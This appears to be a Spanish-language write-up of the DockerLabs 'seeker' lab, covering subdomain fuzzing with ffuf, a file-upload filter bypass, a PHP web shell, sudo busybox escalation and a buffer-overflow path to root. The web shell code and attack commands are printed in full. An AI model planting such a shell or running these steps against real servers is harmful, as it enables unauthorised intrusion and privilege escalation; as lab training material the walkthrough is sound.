nmap: 80

![image](https://github.com/user-attachments/assets/ff3cd078-fc1e-459c-8639-086836758977)

entramos a la pagina y no estaba encontrando nada y viendo el apache2 vi esto:

![image](https://github.com/user-attachments/assets/815b9f3b-7096-4316-816c-ec053989f3d7)

encontré que podemos agregarlo como .dl, si entramos veremos la misma pagina, intente con gobuster otra vez pero no me dio nada asi que lanzamos un fuzzing 

      ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://5eek3r.dl -H "Host: FUZZ.5eek3r.dl" -fs 10705

![image](https://github.com/user-attachments/assets/0ea7d491-d1d2-4b82-abbe-d8a190225222)

obtenemos un "crosswords", como es subdominio lo añadimos al host

![image](https://github.com/user-attachments/assets/7857eb8e-95e8-4700-a735-8f632a5578bb)

y obtenemos

![image](https://github.com/user-attachments/assets/0b6ce348-1d7c-4119-979d-682891662c06)

si ingresamos solo lo codifica. vamos al código fuente  

![image](https://github.com/user-attachments/assets/355c76f4-cdb2-41ca-aede-4059fa21d72a)

capturo con burpsuite pero no encuentro nada, o sea las solicitudes me dan las mismas que la web en si, así que seguimos buscando

lo que podríamos intentar como ya encontramos un subdominio, buscar otro subdominio 

     ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://5eek3r.dl -H "Host: FUZZ.crosswords.5eek3r.dl" -fs 10705 
     
y dimos que tenemos un admin

![image](https://github.com/user-attachments/assets/4481fc1b-b557-4923-93de-0bfd13b1a1d5)

lo agregamos y vemos que hay una subida de archivos

![image](https://github.com/user-attachments/assets/50a7e2f4-5984-4e57-bf52-e5faf10a417b)

pero al intentar subir archivos me aparece que no permite .py, asi que probamos otros y dimos que funciona con phtml

      <?php
       system($_GET['cmd']);
       ?>


![image](https://github.com/user-attachments/assets/1e1e1292-d36a-4143-8a7f-27eff711345a)

ahora en la URL colocamos el archivo

no funciono así que probamos algo mas directo y con otra extensión

![[dockerlabs/medio/seeker/test.png]]

![[dockerlabs/medio/seeker/conexion.png]]

obtenemos conexión, pero antes de lanzar la conexión tenemos que lanzarla desde 
> crosswords.5eek3r.dl/shell.phar

dentro veremos como "escalar"

![[dockerlabs/medio/seeker/gt.png]]

buscamos en https://gtfobins.github.io/gtfobins/busybox/#sudo
nos da el comando de sudo 

     sudo busybox sh

lo modificamos 

     sudo -u astu busybox sh

![[dockerlabs/medio/seeker/usuario1.png]]

veremos esto con el usuario astu

![[bas64.png]]

probamos si se puede hacer un ataque de desbordamiento

![[flow.png]]

vemos que se puede, pero como no podemos ver el código por el formato lo pasamos a ghidra, nos pasamos por medio de un servidor el bs64 y veremos algo importante

    printf("Ejecutando /bin/sh");
    setuid(0);
    system("/bin/sh");
    return;

como se ve esta llamando a root por el setuid(0)
creamos como un "código" por decir así para el desbordamiento

     /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400


![[gdb.png]]

veremos que nos da un valor 0x00000000004013d8
y si colocamos ret nos dará el valor: 0x6341356341346341

obtenemos esto el valor 72 

![[gdb2.png]]

lo que es el offset que se buscaba poder un exploit. hacemos el exploit

![[dockerlabs/medio/seeker/exploit.png]]

con los valores que obtuvimos, lanzamos

![[dockerlabs/medio/seeker/root.png]]

y somos root!
